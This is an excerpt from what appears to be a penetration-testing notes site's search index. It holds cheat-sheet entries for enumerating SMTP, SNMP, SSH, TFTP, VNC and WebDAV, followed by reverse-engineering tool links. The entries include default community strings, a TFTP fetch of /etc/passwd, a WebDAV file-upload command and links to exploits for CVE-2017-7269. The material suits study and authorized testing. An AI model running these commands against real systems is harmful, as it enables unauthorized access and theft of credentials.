- mail from: user@[IP Address] rcpt to: @domain:nobody@recipient-domain Disparate formatting2 - mail from: user@[IP Address] rcpt to: recipient_domain!nobody@[IP Address] http://0daysecurity.com/penetration-testing/enumeration.html","title":"Mail Relay"},{"location":"protocols-and-ports/SMTP-25/#sending-a-mail","text":"HELO my.server.com MAIL FROM: RCPT TO: DATA From: Danny Dolittle To: Sarah Smith Subject: Email sample Mime-Version: 1.0 Content-Type: text/plain; charset=us-ascii This is a test email for you to read. . QUIT","title":"Sending a mail"},{"location":"protocols-and-ports/SMTP-25/#tools","text":"","title":"Tools"},{"location":"protocols-and-ports/SMTP-25/#smtp_enum","text":"auxiliary/scanner/smtp/smtp_enum","title":"smtp_enum"},{"location":"protocols-and-ports/SMTP-25/#smtp-enum-usersnse","text":"nmap \u2013script smtp-enum-users.nse 172.16.212.133","title":"smtp-enum-users.nse"},{"location":"protocols-and-ports/SMTP-25/#other-commands","text":"Command Comment ATRN Authenticated TURN AUTH Authentication BDAT Binary data BURL Remote content DATA The actual email message to be sent. This command is terminated with a line that contains only a EHLO Extended HELO ETRN Extended turn EXPN Expand HELO Identify yourself to the SMTP server. HELP Show available commands MAIL Send mail from email account, MAIL FROM: me@mydomain.com NOOP No-op. Keeps you connection open. ONEX One message transaction only QUIT End session RCPT Send email to recipient, RCPT TO: you@yourdomain.com RSET Reset SAML Send and mail SEND Send SOML Send or mail STARTTLS SUBMITTER SMTP responsible submitter TURN Turn VERB Verbose VRFY Verify","title":"Other commands"},{"location":"protocols-and-ports/SNMP-161/","text":"Simple Network Management Protocol (SNMP) Baed on UDP - Can be suspectable for IP spoofing and replay 1,2,2c versions are plain text Week auth and default community strings (public, default) Devices often support configuration file read and write through private SNMP community string access. Hence having access to private string means router configuration can be altered. Configuration Files snmp.conf snmpd.conf snmp-config.xml SNMP - Management Information Base (MBI) Tree database related to network management. http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.progcomm/doc/progcomc/mib.htm commuity strings - public / private / manager / ... Scanning nmap -sU --open -p 161 ip --open Scan one community string for multiple IPs onesixtyone -c community.txt -i ips.txt SNMPWalk snmpwalk -Os -c public -v 1 ip Probe MBI snmpwalk -c public -v 1 ip 1.3.6.1.2.1.25.4.2.1.2 \u2022 1.3.6.1.2.1.25.1.6.0 System Processes \u2022 1.3.6.1.2.1.25.4.2.1.2 Running Programs \u2022 1.3.6.1.2.1.25.4.2.1.4 Processes Path \u2022 1.3.6.1.2.1.25.2.3.1.4 Storage Units \u2022 1.3.6.1.2.1.25.6.3.1.2 Software Name \u2022 1.3.6.1.4.1.77.1.2.25 User Accounts \u2022 1.3.6.1.2.1.6.13.1.3 TCP Local Ports Default community strings public private cisco cable-docsis ILMI Important properties Windows NT .1.3.6.1.2.1.1.5 Hostnames .1.3.6.1.2.1.4.34.1.5.2.16 IPv6 Address .1.3.6.1.4.1.77.1.4.2 Domain Name .1.3.6.1.4.1.77.1.2.25 Usernames .1.3.6.1.4.1.77.1.2.3.1.1 Running Services .1.3.6.1.4.1.77.1.2.27 Share Information Tools snmpenum perl snmpenum.pl 192.168.38.200 public windows.txt snmpwalk snmpwalk -c public 192.168.38.200 -v 1 OpUtils SolarWinds SNScan SNMP Scanner NS Auditor snmpcheck onesixtyone Scan one community string for multiple IPs","title":"SNMP 161"},{"location":"protocols-and-ports/SNMP-161/#simple-network-management-protocol-snmp","text":"Baed on UDP - Can be suspectable for IP spoofing and replay 1,2,2c versions are plain text Week auth and default community strings (public, default) Devices often support configuration file read and write through private SNMP community string access. Hence having access to private string means router configuration can be altered.","title":"Simple Network Management Protocol (SNMP)"},{"location":"protocols-and-ports/SNMP-161/#configuration-files","text":"snmp.conf snmpd.conf snmp-config.xml","title":"Configuration Files"},{"location":"protocols-and-ports/SNMP-161/#snmp-management-information-base-mbi","text":"Tree database related to network management. http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.progcomm/doc/progcomc/mib.htm commuity strings - public / private / manager / ...","title":"SNMP - Management Information Base (MBI)"},{"location":"protocols-and-ports/SNMP-161/#scanning","text":"nmap -sU --open -p 161 ip --open Scan one community string for multiple IPs onesixtyone -c community.txt -i ips.txt","title":"Scanning"},{"location":"protocols-and-ports/SNMP-161/#snmpwalk","text":"snmpwalk -Os -c public -v 1 ip","title":"SNMPWalk"},{"location":"protocols-and-ports/SNMP-161/#probe-mbi","text":"snmpwalk -c public -v 1 ip 1.3.6.1.2.1.25.4.2.1.2 \u2022 1.3.6.1.2.1.25.1.6.0 System Processes \u2022 1.3.6.1.2.1.25.4.2.1.2 Running Programs \u2022 1.3.6.1.2.1.25.4.2.1.4 Processes Path \u2022 1.3.6.1.2.1.25.2.3.1.4 Storage Units \u2022 1.3.6.1.2.1.25.6.3.1.2 Software Name \u2022 1.3.6.1.4.1.77.1.2.25 User Accounts \u2022 1.3.6.1.2.1.6.13.1.3 TCP Local Ports","title":"Probe MBI"},{"location":"protocols-and-ports/SNMP-161/#default-community-strings","text":"public private cisco cable-docsis ILMI","title":"Default community strings"},{"location":"protocols-and-ports/SNMP-161/#important-properties","text":"Windows NT .1.3.6.1.2.1.1.5 Hostnames .1.3.6.1.2.1.4.34.1.5.2.16 IPv6 Address .1.3.6.1.4.1.77.1.4.2 Domain Name .1.3.6.1.4.1.77.1.2.25 Usernames .1.3.6.1.4.1.77.1.2.3.1.1 Running Services .1.3.6.1.4.1.77.1.2.27 Share Information","title":"Important properties"},{"location":"protocols-and-ports/SNMP-161/#tools","text":"","title":"Tools"},{"location":"protocols-and-ports/SNMP-161/#snmpenum","text":"perl snmpenum.pl 192.168.38.200 public windows.txt","title":"snmpenum"},{"location":"protocols-and-ports/SNMP-161/#snmpwalk_1","text":"snmpwalk -c public 192.168.38.200 -v 1 OpUtils SolarWinds SNScan SNMP Scanner NS Auditor snmpcheck onesixtyone Scan one community string for multiple IPs","title":"snmpwalk"},{"location":"protocols-and-ports/SQL-Server-1433,1434/","text":"Please check /databases/sqlserver dedicated folder.","title":"SQL Server 1433,1434"},{"location":"protocols-and-ports/SSH-22/","text":"Configuration Files ssh_config sshd_config authorized_keys ssh_known_hosts .shosts Tools scanssh scanssh -p -r -e excludes random(no.)/Network_ID/Subnet_Mask SSH Auditor - Re-check all known hosts as new credentials are added. It will only check the new credentials. - Queue a full credential scan on any new host discovered. - Queue a full credential scan on any known host whose ssh version or key fingerprint changes. - Attempt command execution as well as attempt to tunnel a TCP connection. - Re-check each credential using a per credential scan_interval - default 14 days. GitHub: https://github.com/ncsa/ssh-auditor HASSH - a Profiling Method for SSH Clients and Servers. \"HASSH\" is a network fingerprinting standard which can be used to identify specific Client and Server SSH implementations. The fingerprints can be easily stored, searched and shared in the form of an MD5 fingerprint. GitHub: https://github.com/salesforce/hassh/","title":"SSH 22"},{"location":"protocols-and-ports/SSH-22/#configuration-files","text":"ssh_config sshd_config authorized_keys ssh_known_hosts .shosts","title":"Configuration Files"},{"location":"protocols-and-ports/SSH-22/#tools","text":"","title":"Tools"},{"location":"protocols-and-ports/SSH-22/#scanssh","text":"scanssh -p -r -e excludes random(no.)/Network_ID/Subnet_Mask","title":"scanssh"},{"location":"protocols-and-ports/SSH-22/#ssh-auditor","text":"- Re-check all known hosts as new credentials are added. It will only check the new credentials. - Queue a full credential scan on any new host discovered. - Queue a full credential scan on any known host whose ssh version or key fingerprint changes. - Attempt command execution as well as attempt to tunnel a TCP connection. - Re-check each credential using a per credential scan_interval - default 14 days. GitHub: https://github.com/ncsa/ssh-auditor","title":"SSH Auditor"},{"location":"protocols-and-ports/SSH-22/#hassh-a-profiling-method-for-ssh-clients-and-servers","text":"\"HASSH\" is a network fingerprinting standard which can be used to identify specific Client and Server SSH implementations. The fingerprints can be easily stored, searched and shared in the form of an MD5 fingerprint. GitHub: https://github.com/salesforce/hassh/","title":"HASSH - a Profiling Method for SSH Clients and Servers."},{"location":"protocols-and-ports/TFTP-69/","text":"Enumeration tftp ip_address PUT local_file tftp ip_address GET conf.txt (or other files) Solarwinds TFTP server tftp \u2013 i IP GET /etc/passwd (old Solaris) Connect TFTP tftp connect (to) ip tftp verbose Transfer file tftp binary tftp put example.exe /windows/system32/example.exe Receive file tftp binary tftp get /windows/system32/example.exe","title":"TFTP 69"},{"location":"protocols-and-ports/TFTP-69/#enumeration","text":"tftp ip_address PUT local_file tftp ip_address GET conf.txt (or other files) Solarwinds TFTP server tftp \u2013 i IP GET /etc/passwd (old Solaris)","title":"Enumeration"},{"location":"protocols-and-ports/TFTP-69/#connect","text":"TFTP tftp connect (to) ip tftp verbose","title":"Connect"},{"location":"protocols-and-ports/TFTP-69/#transfer-file","text":"tftp binary tftp put example.exe /windows/system32/example.exe","title":"Transfer file"},{"location":"protocols-and-ports/TFTP-69/#receive-file","text":"tftp binary tftp get /windows/system32/example.exe","title":"Receive file"},{"location":"protocols-and-ports/Telnet-23/","text":"Configuration files /etc/inetd.conf /etc/xinetd.d/telnet /etc/xinetd.d/stelnet Tools Telnet Honeypot - https://github.com/stamparm/hontel OS fingerprinting with telnet: https://securiteam.com/tools/6J00L0K06U/","title":"Telnet 23"},{"location":"protocols-and-ports/Telnet-23/#configuration-files","text":"/etc/inetd.conf /etc/xinetd.d/telnet /etc/xinetd.d/stelnet","title":"Configuration files"},{"location":"protocols-and-ports/Telnet-23/#tools","text":"Telnet Honeypot - https://github.com/stamparm/hontel OS fingerprinting with telnet: https://securiteam.com/tools/6J00L0K06U/","title":"Tools"},{"location":"protocols-and-ports/Tor-9001,9030/","text":"","title":"Tor 9001,9030"},{"location":"protocols-and-ports/VNC-5900/","text":"Configuration files .vnc /etc/vnc/config $HOME/.vnc/config /etc/sysconfig/vncservers /etc/vnc.conf Registry locations \\HKEY_CURRENT_USER\\Software\\ORL\\WinVNC3 \\HKEY_USERS\\.DEFAULT\\Software\\ORL\\WinVNC3 Description key 0x238210763578887 Connect over SSH tunnel ssh -L5901:127.0.0.1:5901 charix@10.10.10.84 vncviewer 127.0.0.1::5901 vncviewer 127.0.0.1::5901\u200b -passwd\u200b secret","title":"VNC 5900"},{"location":"protocols-and-ports/VNC-5900/#configuration-files","text":".vnc /etc/vnc/config $HOME/.vnc/config /etc/sysconfig/vncservers /etc/vnc.conf","title":"Configuration files"},{"location":"protocols-and-ports/VNC-5900/#registry-locations","text":"\\HKEY_CURRENT_USER\\Software\\ORL\\WinVNC3 \\HKEY_USERS\\.DEFAULT\\Software\\ORL\\WinVNC3","title":"Registry locations"},{"location":"protocols-and-ports/VNC-5900/#description-key","text":"0x238210763578887","title":"Description key"},{"location":"protocols-and-ports/VNC-5900/#connect-over-ssh-tunnel","text":"ssh -L5901:127.0.0.1:5901 charix@10.10.10.84 vncviewer 127.0.0.1::5901 vncviewer 127.0.0.1::5901\u200b -passwd\u200b secret","title":"Connect over SSH tunnel"},{"location":"protocols-and-ports/WebDev/","text":"Check Capabilities davtest -url http://grandpa.htb/ Interact Command-line WebDAV client for Unix: http://www.webdav.org/cadaver/ Commands: https://www.systutorials.com/docs/linux/man/1-cadaver/ cadaver http://10.10.10.15 Upload file curl --upload-file ./example.php --user user:password http:// ip /webdav_url Exploits: IIS 6.0 in Microsoft Windows Server 2003 R2 (CVE-2017-7269): iis_webdav_scstoragepathfromurl https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl https://github.com/edwardz246003/IIS_exploit https://blog.0patch.com/2017/03/0patching-immortal-cve-2017-7269.html https://github.com/gottburgm/Exploits/blob/master/CVE-2017-7269/CVE_2017_7269.pl IIS 6.0","title":"WebDev"},{"location":"protocols-and-ports/WebDev/#check-capabilities","text":"davtest -url http://grandpa.htb/","title":"Check Capabilities"},{"location":"protocols-and-ports/WebDev/#interact","text":"Command-line WebDAV client for Unix: http://www.webdav.org/cadaver/ Commands: https://www.systutorials.com/docs/linux/man/1-cadaver/ cadaver http://10.10.10.15","title":"Interact"},{"location":"protocols-and-ports/WebDev/#upload-file","text":"curl --upload-file ./example.php --user user:password http:// ip /webdav_url","title":"Upload file"},{"location":"protocols-and-ports/WebDev/#exploits","text":"IIS 6.0 in Microsoft Windows Server 2003 R2 (CVE-2017-7269): iis_webdav_scstoragepathfromurl https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl https://github.com/edwardz246003/IIS_exploit https://blog.0patch.com/2017/03/0patching-immortal-cve-2017-7269.html https://github.com/gottburgm/Exploits/blob/master/CVE-2017-7269/CVE_2017_7269.pl IIS 6.0","title":"Exploits:"},{"location":"protocols-and-ports/X11-6000/","text":"Configuration files /etc/Xn.hosts /usr/lib/X11/xdm Search through all files for the command xhost + or /usr/bin/X11/xhost + /usr/lib/X11/xdm/xsession /usr/lib/X11/xdm/xsession-remote /usr/lib/X11/xdm/xsession.0 /usr/lib/X11/xdm/xdm-config DisplayManager*authorize:on","title":"X11 6000"},{"location":"protocols-and-ports/X11-6000/#configuration-files","text":"/etc/Xn.hosts /usr/lib/X11/xdm Search through all files for the command xhost + or /usr/bin/X11/xhost + /usr/lib/X11/xdm/xsession /usr/lib/X11/xdm/xsession-remote /usr/lib/X11/xdm/xsession.0 /usr/lib/X11/xdm/xdm-config DisplayManager*authorize:on","title":"Configuration files"},{"location":"protocols-and-ports/rlogin-513/","text":"Locating files find / -name .rhosts locate .rhosts Manual login rlogin hostname -l username References Summarized References http://0daysecurity.com/penetration-testing/enumeration.html","title":"Rlogin 513"},{"location":"protocols-and-ports/rlogin-513/#locating-files","text":"find / -name .rhosts locate .rhosts","title":"Locating files"},{"location":"protocols-and-ports/rlogin-513/#manual-login","text":"rlogin hostname -l username","title":"Manual login"},{"location":"protocols-and-ports/rlogin-513/#references","text":"","title":"References"},{"location":"protocols-and-ports/rlogin-513/#summarized-references","text":"http://0daysecurity.com/penetration-testing/enumeration.html","title":"Summarized References"},{"location":"protocols-and-ports/z-References/","text":"References Databases Service Name and Transport Protocol Port Number Registry","title":"References"},{"location":"protocols-and-ports/z-References/#references","text":"","title":"References"},{"location":"protocols-and-ports/z-References/#databases","text":"Service Name and Transport Protocol Port Number Registry","title":"Databases"},{"location":"reverse-engineering/0-cheatsheet/","text":"","title":"0 cheatsheet"},{"location":"reverse-engineering/x-Defense/","text":"Defense References Disassembly desynchronization: https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/the_return_of_disassembly_desynchronization/the_return_of_disassembly_desynchronization.md","title":"Defense"},{"location":"reverse-engineering/x-Defense/#defense","text":"","title":"Defense"},{"location":"reverse-engineering/x-Defense/#references","text":"Disassembly desynchronization: https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/the_return_of_disassembly_desynchronization/the_return_of_disassembly_desynchronization.md","title":"References"},{"location":"reverse-engineering/y-Practice/","text":"Practice https://www.malwaretech.com/beginner-malware-reversing-challenges","title":"Practice"},{"location":"reverse-engineering/y-Practice/#practice","text":"https://www.malwaretech.com/beginner-malware-reversing-challenges","title":"Practice"},{"location":"reverse-engineering/y-Tools/","text":"Tools Collections Vagrant box with binary analysis tools: https://github.com/Hamz-a/binanalysisbox radare2 Frida Homepage: https://www.frida.re/ Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers. angr Homepage: https://angr.io/ Python framework for analyzing binaries. It combines both static and dynamic symbolic (\"concolic\") analysis, making it applicable to a variety of tasks. Gef GitHub: https://github.com/hugsy/gef GEF - GDB Enhanced Features for exploit devs reversers YY-CHR Supports editing NES, SNES, Genesis, PCE, GG, WS/C, GB/C, MSX 1+2, NGP/C, SMS, and GBA graphics. GitHub: https://www.romhacking.net/utilities/119/ ProcDump ProcDump is a Linux reimagining of the classic ProcDump tool from the Sysinternals suite of tools for Windows. ProcDump provides a convenient way for Linux developers to create core dumps of their application based on performance triggers. GitHub: https://github.com/Microsoft/ProcDump-for-Linux Other mleak - small memory leak tracer for C programs: https://github.com/hyc/mleak","title":"Tools"},{"location":"reverse-engineering/y-Tools/#tools","text":"","title":"Tools"},{"location":"reverse-engineering/y-Tools/#collections","text":"Vagrant box with binary analysis tools: https://github.com/Hamz-a/binanalysisbox","title":"Collections"},{"location":"reverse-engineering/y-Tools/#radare2","text":"","title":"radare2"},{"location":"reverse-engineering/y-Tools/#frida","text":"Homepage: https://www.frida.re/ Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.","title":"Frida"},{"location":"reverse-engineering/y-Tools/#angr","text":"Homepage: https://angr.io/ Python framework for analyzing binaries. It combines both static and dynamic symbolic (\"concolic\") analysis, making it applicable to a variety of tasks.","title":"angr"},{"location":"reverse-engineering/y-Tools/#gef","text":"GitHub: https://github.com/hugsy/gef GEF - GDB Enhanced Features for exploit devs reversers","title":"Gef"},{"location":"reverse-engineering/y-Tools/#yy-chr","text":"Supports editing NES, SNES, Genesis, PCE, GG, WS/C, GB/C, MSX 1+2, NGP/C, SMS, and GBA graphics. GitHub: https://www.romhacking.net/utilities/119/","title":"YY-CHR"},{"location":"reverse-engineering/y-Tools/#procdump","text":"ProcDump is a Linux reimagining of the classic ProcDump tool from the Sysinternals suite of tools for Windows. ProcDump provides a convenient way for Linux developers to create core dumps of their application based on performance triggers. GitHub: https://github.com/Microsoft/ProcDump-for-Linux","title":"ProcDump"},{"location":"reverse-engineering/y-Tools/#other","text":"mleak - small memory leak tracer for C programs: https://github.com/hyc/mleak","title":"Other"},{"location":"reverse-engineering/z-References/","text":"References 101 - https://www.youtube.com/watch?v=Min6DWTHDBw feature=em-uploademail Reverse Engineering for Beginners: https://www.begin.re/ Learning Radare2 by Reversing a UMPC Bios: https://stragedevices.blogspot.com/2019/02/finding-verified-intel-atom-msrs-in.html Survival guide for Radare2 with practice: https://github.com/ZigzagSecurity/survival-guide-radare2 http://www.capstone-engine.org/showcase.html Reverse engineering simple binaries created in Fortran, C, C++, Pascal and Ada: https://www.mkdynamics.net/current_projects/computer_security/Disassembling_binaries/disassembling_binaries.html Port-oriented Programming: https://twitter.com/bxl1989/status/1085101696735268865 OALabs - WinDbg Basics for Malware Analysis: https://www.youtube.com/watch?v=QuFJpH3My7A list=PLGf_j68jNtWG_6ZwFN4kx7jfKTQXoG_BN The 101 of ELF files on Linux: Understanding and Analysis: https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/ Ground Zero: Reverse Engineering: https://scriptdotsh.com/index.php/category/reverse-engineering/","title":"References"},{"location":"reverse-engineering/z-References/#references","text":"101 - https://www.youtube.com/watch?v=Min6DWTHDBw feature=em-uploademail Reverse Engineering for Beginners: https://www.begin.re/ Learning Radare2 by Reversing a UMPC Bios: https://stragedevices.blogspot.com/2019/02/finding-verified-intel-atom-msrs-in.html Survival guide for Radare2 with practice: https://github.com/ZigzagSecurity/survival-guide-radare2 http://www.capstone-engine.org/showcase.html Reverse engineering simple binaries created in Fortran, C, C++, Pascal and Ada: https://www.mkdynamics.net/current_projects/computer_security/Disassembling_binaries/disassembling_binaries.html Port-oriented Programming: https://twitter.com/bxl1989/status/1085101696735268865 OALabs - WinDbg Basics for Malware Analysis: https://www.youtube.com/watch?v=QuFJpH3My7A list=PLGf_j68jNtWG_6ZwFN4kx7jfKTQXoG_BN The 101 of ELF files on Linux: Understanding and Analysis: https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/ Ground Zero: Reverse Engineering: https://scriptdotsh.com/index.php/category/reverse-engineering/","title":"References"},{"location":"reverse-engineering/linux/elf/","text":"ELF References ELF Binary Mangling Part 1\u200a\u2014\u200aConcepts: https://medium.com/@dmxinajeansuit/elf-binary-mangling-part-1-concepts-e00cb1352301 Elf Binary Mangling Pt. 2: Golfin\u2019: https://medium.com/@dmxinajeansuit/elf-binary-mangling-pt-2-golfin-7e5c82bb482c Elf Binary Mangling Part 3\u200a\u2014\u200aWeaponization: https://medium.com/@dmxinajeansuit/elf-binary-mangling-part-3-weaponization-6e11971108b3 http://romainthomas.fr/slides/18-06-Recon18-Formats-Instrumentation.pdf Dissecting and exploiting ELF files: https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267","title":"ELF"},{"location":"reverse-engineering/linux/elf/#elf","text":"","title":"ELF"},{"location":"reverse-engineering/linux/elf/#references","text":"ELF Binary Mangling Part 1\u200a\u2014\u200aConcepts: https://medium.com/@dmxinajeansuit/elf-binary-mangling-part-1-concepts-e00cb1352301 Elf Binary Mangling Pt. 2: Golfin\u2019: https://medium.com/@dmxinajeansuit/elf-binary-mangling-pt-2-golfin-7e5c82bb482c Elf Binary Mangling Part 3\u200a\u2014\u200aWeaponization: https://medium.com/@dmxinajeansuit/elf-binary-mangling-part-3-weaponization-6e11971108b3 http://romainthomas.fr/slides/18-06-Recon18-Formats-Instrumentation.pdf Dissecting and exploiting ELF files: https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267","title":"References"},{"location":"reverse-engineering/linux/gdb/","text":"GDB Run GBD with env variables env - gdb /bin/lcars Profiles PEDA - http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf Display Information info registers info all-registers Display memory map vmmap Display Registers / Memory display /x $eax x/50c $eax x/s $eax Disassemble set disassembly-flavor intel disassemble $eip Print Type Information ptype Student Check security information checksec","title":"GDB"},{"location":"reverse-engineering/linux/gdb/#gdb","text":"","title":"GDB"},{"location":"reverse-engineering/linux/gdb/#run-gbd-with-env-variables","text":"env - gdb /bin/lcars","title":"Run GBD with env variables"},{"location":"reverse-engineering/linux/gdb/#profiles","text":"PEDA - http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf","title":"Profiles"},{"location":"reverse-engineering/linux/gdb/#display-information","text":"info registers info all-registers","title":"Display Information"},{"location":"reverse-engineering/linux/gdb/#display-memory-map","text":"vmmap","title":"Display memory map"},{"location":"reverse-engineering/linux/gdb/#display-registers-memory","text":"display /x $eax x/50c $eax x/s $eax","title":"Display Registers / Memory"},{"location":"reverse-engineering/linux/gdb/#disassemble","text":"set disassembly-flavor intel disassemble $eip","title":"Disassemble"},{"location":"reverse-engineering/linux/gdb/#print-type-information","text":"ptype Student","title":"Print Type Information"},{"location":"reverse-engineering/linux/gdb/#check-security-information","text":"checksec","title":"Check security information"},{"location":"reverse-engineering/linux/setup/","text":"Lab Setup Temporarily disable ASLR $ sudo sysctl -w kernel.randomize_va_space=0 Allow ptrace processes $ sudo sysctl -w kernel.yama.ptrace_scope=0 Installing 32bit Libraries dpkg --add-architecture i386 apt-get install libc6:i386","title":"Lab Setup"},{"location":"reverse-engineering/linux/setup/#lab-setup","text":"","title":"Lab Setup"},{"location":"reverse-engineering/linux/setup/#temporarily-disable-aslr","text":"$ sudo sysctl -w kernel.randomize_va_space=0","title":"Temporarily disable ASLR"},{"location":"reverse-engineering/linux/setup/#allow-ptrace-processes","text":"$ sudo sysctl -w kernel.yama.ptrace_scope=0","title":"Allow ptrace processes"},{"location":"reverse-engineering/linux/setup/#installing-32bit-libraries","text":"dpkg --add-architecture i386 apt-get install libc6:i386","title":"Installing 32bit Libraries"},{"location":"reverse-engineering/specific/arm/","text":"ARM References SUE 2017 - Reverse Engineering Embedded ARM Devices - by pancake: https://www.youtube.com/watch?v=oXSx0Qo2Upk feature=youtu.be ARM ASSEMBLY BASICS CHEATSHEET: https://azeria-labs.com/assembly-basics-cheatsheet/","title":"ARM"},{"location":"reverse-engineering/specific/arm/#arm","text":"","title":"ARM"},{"location":"reverse-engineering/specific/arm/#references","text":"SUE 2017 - Reverse Engineering Embedded ARM Devices - by pancake: https://www.youtube.com/watch?v=oXSx0Qo2Upk feature=youtu.be ARM ASSEMBLY BASICS CHEATSHEET: https://azeria-labs.com/assembly-basics-cheatsheet/","title":"References"},{"location":"reverse-engineering/specific/c-cpp/","text":"C / C++ Demangle function names http://demangler.com","title":"C / C++"},{"location":"reverse-engineering/specific/c-cpp/#c-c","text":"","title":"C / C++"},{"location":"reverse-engineering/specific/c-cpp/#demangle-function-names","text":"http://demangler.com","title":"Demangle function names"},{"location":"reverse-engineering/specific/dotnet/","text":".NET File Format .text - Import Table, Import Address Table and .NET Section .reloc - To relocate the address which the EntryPoint instruction jumps to (it's the only address contained the IAT). The IT counts just one imported module (mscoree.dll) and one imported function (_CorExeMain for executables and _CorDllMain for dynamic load libraries). .rsrc - Main icon for an executable, since all others resources are in the .NET Section. References: - https://www.ntcore.com/files/dotnetformat.htm - https://www.red-gate.com/simple-talk/blogs/anatomy-of-a-net-assembly-pe-headers/ Dynamically load memory-only modules Assembly.Load(byte[]) References: - https://www.endgame.com/blog/technical-blog/hunting-memory-net-attacks .NET framework included in OS version https://blogs.msdn.microsoft.com/astebner/2007/03/14/mailbag-what-version-of-the-net-framework-is-included-in-what-version-of-the-os/ Tools CFF Explorer: https://ntcore.com/?page_id=388 PE inspection library allowing .NET programmers to read, modify and write executable files: https://github.com/Washi1337/AsmResolver Parser for Windows Portable Executable headers: https://github.com/secana/PeNet References Reverse Engineering .NET Applications For Beginners: https://www.youtube.com/watch?v=KOVXWRrd_qg","title":".NET"},{"location":"reverse-engineering/specific/dotnet/#net","text":"","title":".NET"},{"location":"reverse-engineering/specific/dotnet/#file-format","text":".text - Import Table, Import Address Table and .NET Section .reloc - To relocate the address which the EntryPoint instruction jumps to (it's the only address contained the IAT). The IT counts just one imported module (mscoree.dll) and one imported function (_CorExeMain for executables and _CorDllMain for dynamic load libraries). .rsrc - Main icon for an executable, since all others resources are in the .NET Section. References: - https://www.ntcore.com/files/dotnetformat.htm - https://www.red-gate.com/simple-talk/blogs/anatomy-of-a-net-assembly-pe-headers/","title":"File Format"},{"location":"reverse-engineering/specific/dotnet/#dynamically-load-memory-only-modules","text":"Assembly.Load(byte[]) References: - https://www.endgame.com/blog/technical-blog/hunting-memory-net-attacks","title":"Dynamically load memory-only modules"},{"location":"reverse-engineering/specific/dotnet/#net-framework-included-in-os-version","text":"https://blogs.msdn.microsoft.com/astebner/2007/03/14/mailbag-what-version-of-the-net-framework-is-included-in-what-version-of-the-os/","title":".NET framework included in OS version"},{"location":"reverse-engineering/specific/dotnet/#tools","text":"CFF Explorer: https://ntcore.com/?page_id=388 PE inspection library allowing .NET programmers to read, modify and write executable files: https://github.com/Washi1337/AsmResolver Parser for Windows Portable Executable headers: https://github.com/secana/PeNet","title":"Tools"},{"location":"reverse-engineering/specific/dotnet/#references","text":"Reverse Engineering .NET Applications For Beginners: https://www.youtube.com/watch?v=KOVXWRrd_qg","title":"References"},{"location":"reverse-engineering/specific/go/","text":"Go References Set of IDA Pro scripts for parsing GoLang types information stored in compiled binary: https://github.com/sibears/IDAGolangHelper","title":"Go"},{"location":"reverse-engineering/specific/go/#go","text":"","title":"Go"},{"location":"reverse-engineering/specific/go/#references","text":"Set of IDA Pro scripts for parsing GoLang types information stored in compiled binary: https://github.com/sibears/IDAGolangHelper","title":"References"},{"location":"reverse-engineering/specific/java/","text":"Java Toold JADX JD-GUI Procyon, CFR, Fernflower etc. Bytecodeviewer dex2jar APK tool","title":"Java"},{"location":"reverse-engineering/specific/java/#java","text":"","title":"Java"},{"location":"reverse-engineering/specific/java/#toold","text":"","title":"Toold"},{"location":"reverse-engineering/specific/java/#jadx","text":"","title":"JADX"},{"location":"reverse-engineering/specific/java/#jd-gui","text":"","title":"JD-GUI"},{"location":"reverse-engineering/specific/java/#procyon-cfr-fernflower-etc","text":"","title":"Procyon, CFR, Fernflower etc."},{"location":"reverse-engineering/specific/java/#bytecodeviewer","text":"","title":"Bytecodeviewer"},{"location":"reverse-engineering/specific/java/#dex2jar","text":"","title":"dex2jar"},{"location":"reverse-engineering/specific/java/#apk-tool","text":"","title":"APK tool"},{"location":"reverse-engineering/specific/mobile-app/","text":"Mobile App References Inro: https://medium.com/@xplodwild/turning-the-frustration-of-a-mobile-game-into-a-reverse-engineering-training-a9887043efdf They updated, we dumped memory: https://blog.usejournal.com/reverse-engineering-of-a-mobile-game-part-2-they-updated-we-dumped-memory-27046efdfb85 Now, it\u2019s obfuscated: https://medium.com/@xplodwild/reverse-engineering-of-a-mobile-game-part-3-now-its-obfuscated-9c31e29c386b","title":"Mobile App"},{"location":"reverse-engineering/specific/mobile-app/#mobile-app","text":"","title":"Mobile App"},{"location":"reverse-engineering/specific/mobile-app/#references","text":"Inro: https://medium.com/@xplodwild/turning-the-frustration-of-a-mobile-game-into-a-reverse-engineering-training-a9887043efdf They updated, we dumped memory: https://blog.usejournal.com/reverse-engineering-of-a-mobile-game-part-2-they-updated-we-dumped-memory-27046efdfb85 Now, it\u2019s obfuscated: https://medium.com/@xplodwild/reverse-engineering-of-a-mobile-game-part-3-now-its-obfuscated-9c31e29c386b","title":"References"},{"location":"reverse-engineering/windows/pe/","text":"PE Files References Rich Header - http://bytepointer.com/articles/the_microsoft_rich_header.htm Learning binary file formats: https://board.flatassembler.net/topic.php?t=20690 / https://twitter.com/grysztar/status/1088901193747845120","title":"PE Files"},{"location":"reverse-engineering/windows/pe/#pe-files","text":"","title":"PE Files"},{"location":"reverse-engineering/windows/pe/#references","text":"Rich Header - http://bytepointer.com/articles/the_microsoft_rich_header.htm Learning binary file formats: https://board.flatassembler.net/topic.php?t=20690 / https://twitter.com/grysztar/status/1088901193747845120","title":"References"},{"location":"reverse-engineering/windows/tools/","text":"Tools Collections A list of static analysis tools for Portable Executable (PE) files: https://www.peerlyst.com/posts/a-list-of-static-analysis-tools-for-portable-executable-pe-files-susan-parker?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post libpeconv A library to load, manipulate, dump PE files. Github - https://github.com/hasherezade/libpeconv filealyzer Helps you explore alternate data streams, #PE/#ELF data and anomalies, file signatures, EXIF data, MZ header, #OpenSBI, #PEiD, #VirusTotal, Android and iOS app (file) info, all in one neat UI. Home: 